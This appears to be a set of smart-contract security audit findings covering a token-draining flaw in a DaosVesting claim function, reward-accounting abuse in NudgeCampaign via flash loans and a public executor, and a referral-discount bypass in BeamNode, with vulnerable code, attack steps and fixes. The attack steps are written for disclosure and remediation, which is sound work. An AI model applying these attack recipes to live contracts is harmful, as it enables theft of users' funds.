Critical Risk

## Description

The `DaosVesting::claim()` function has a critical vulnerability that allows an attacker to drain tokens from legitimate DAOs. The issue stems from insufficient validation of the DAO contract address and its state.

Vulnerable code in `DaosVesting::claim()`:

```solidity
function claim(address dao, address user, uint256 index) external {
    IDaosLive daosLive = IDaosLive(dao);
@-> address token = daosLive.token();

@-> uint256 maxPercent = getClaimablePercent(dao, index);
    if (maxPercent > DENOMINATOR) revert InvalidCalculation();

    unchecked {
@->     uint256 totalAmount = daosLive.getContributionTokenAmount(user);
        uint256 maxAmount = (totalAmount * maxPercent) / DENOMINATOR;
        if (maxAmount < claimedAmounts[dao][user]) {
            revert InvalidCalculation();
        }
        uint256 amount = maxAmount - claimedAmounts[dao][user];

        if (amount > 0) {
            claimedAmounts[dao][user] += amount;
            totalClaimeds[dao] += amount;
@->         TransferHelper.safeTransfer(token, user, amount);
            observer.emitClaimed(dao, token, user, amount);
        }
    }
}
```

**Attack Vector:**

1. Attacker deploys fake malicious contract implementing `IDaosLive`
2. Sets `token` address to a legitimate DAO's token
3. Implements `getContributionTokenAmount()` to manually return the amount of legit `DaosLive` tokens locked in `DaoVesting.sol` contract.
4. Sets vesting schedules of that Fake `IDaosLive` implementation with 100% unlock for an `index`.
5. Calls `claim()` on the vesting contract with their Fake malicious `DoasLive` contract address
6. Receives tokens from the legitimate DAO's vesting contract

## Location of Affected Code

File: [contracts/DaosVesting.sol#L91](https://github.com/ED3N-Ventures/daoslive-sc/blob/9a1856db2060b609a17b24aa72ab35f2cdf09031/contracts/DaosVesting.sol#L91)

```solidity
function claim(address dao, address user, uint256 index) external {
    IDaosLive daosLive = IDaosLive(dao);
@-> address token = daosLive.token();

@-> uint256 maxPercent = getClaimablePercent(dao, index);
    if (maxPercent > DENOMINATOR) revert InvalidCalculation();

    unchecked {
@->     uint256 totalAmount = daosLive.getContributionTokenAmount(user);
        uint256 maxAmount = (totalAmount * maxPercent) / DENOMINATOR;
        if (maxAmount < claimedAmounts[dao][user]) {
            revert InvalidCalculation();
        }
        uint256 amount = maxAmount - claimedAmounts[dao][user];

        if (amount > 0) {
            claimedAmounts[dao][user] += amount;
            totalClaimeds[dao] += amount;
@->         TransferHelper.safeTransfer(token, user, amount);
            observer.emitClaimed(dao, token, user, amount);
        }
    }
}
```

## Impact

- Complete drain of tokens from legitimate DAOs
- Loss of all funds of vested tokens that should have been claimed by the real contributors of `DaosLive`
- Permanent loss of tokens
- Affects all DAOs using the vesting contract.

## Recommendation

- Restrict the caller to claim the tokens only through `DaosLive` contract function, claim only. Do not allow users to clam directly through the vesting contract.
- Validate that the DAO contract is legitimate or not.

## Team Response

Fixed.

### Example 2

**Auto Label:** Insufficient input validation and improper state checks enable attackers to claim rewards multiple times or redirect rewards to unauthorized addresses, leading to reward theft and financial loss.

### Summary

The `NudgeCampaign::handleReallocation` function allows any attacker to manipulate reward allocations through flash loans or repeated calls with real fund via Li.Fi’s executor. This can lead to reward depletion and disruption of legitimate user rewards even after invalidating the attacker

### Vulnerability Details

The vulnerability stems from two main issues:

1. **Insufficient Caller Validation**: While the function checks for `SWAP_CALLER_ROLE`, this role is assigned to Li.Fi’s executor which can be called by anyone, effectively bypassing intended access controls.
2. **Reward Accounting Flaw**: The system fails to properly reset claimable amounts when participations are invalidated, allowing attackers to:

   * Claim all allocations through flash loans
   * Perform repeated reallocations via Li.Fi’s executor
   * Cause permanent reduction of available rewards through multiple invalidations

The `invalidateParticipations` function only subtracts from `pendingRewards` but doesn’t return the fees to the claimable pool, creating a growing discrepancy in reward accounting.

### Proof of Concept

Here is a test to prove this. This was run in mainnet fork. Since this will be deployed on Ethereum and other L2s in from the doc. Create a new test file and add this to the test suite `src/test/NudgeCampaignAttackTest.t.sol`.

* Gas used per attack: 432808
* Attack ran 157 times
* Total gas: `432808 * 157 = 67950856`
  With the current Ethereum gas price of 0.701 gwei per gas, it’ll cost 0.`701 * 67950856` gwei = 47633550.056 gwei
* This is 0.0476 Ether (Current Ether price is `$2087`). `2087 * 0.0476 = $99.34`
* It cost about `$99.34` in gas to launch the attack. This will be cheaper on L2, making this attack very possible.

### Impact

This vulnerability allows attackers to:

* Maliciously allocate campaign rewards through flash loans
* Perform denial-of-service attacks on legitimate users’ rewards
* Permanently reduce available rewards through repeated invalidations
* Disrupt the intended economic model of the campaign system

The attack could be executed at minimal cost and would be difficult to detect until rewards are significantly depleted.

### Tools Used

Foundry

### Recommended mitigation steps

Fix reward accounting:
```

function invalidateParticipations(uint256[] calldata pIDs) external onlyNudgeOperator {
    for (uint256 i = 0; i < pIDs.length; i++) {
        Participation storage participation = participations[pIDs[i]];

        if (participation.status != ParticipationStatus.PARTICIPATING) {
            continue;
        }

        participation.status = ParticipationStatus.INVALIDATED;
        uint256 totalReward = participation.rewardAmount +
                            (participation.rewardAmount * feeBasisPoints / BASIS_POINTS);
        pendingRewards -= participation.rewardAmount;
        claimableRewards += totalReward; // Add to claimable pool
    }
    emit ParticipationInvalidated(pIDs);
}
```

### Example 3

**Auto Label:** Common vulnerability type: **Missing access control and improper referral validation** enabling unauthorized reward claims, fee manipulation, and revenue leakage through self-referencing or expired referrals.  

**Original Text Preview:**

In BeamNode, we have one referral system. When users deposit with one referral for the first time, they can buy one NFT at a discounted price. When users want to deposit with the referrer for the second time, we will not provide one discount for them.

The problem is that this design is quite easy to be bypassed. If users want to deposit with the referrer the second time, they can transfer funds to another address and deposit and get the discount.

```solidity
    function _setReferrer(address _user, address _referrer) internal {
        if (users[_user].referrer == address(0) && _isValidReferrer(_user, _referrer)) {
            users[_user].referrer = _referrer;
        } else {
            require(_referrer == address(0), InvalidReferral());
        }
    }
```

If this design is necessary, we should add one depositor whitelist for this function.
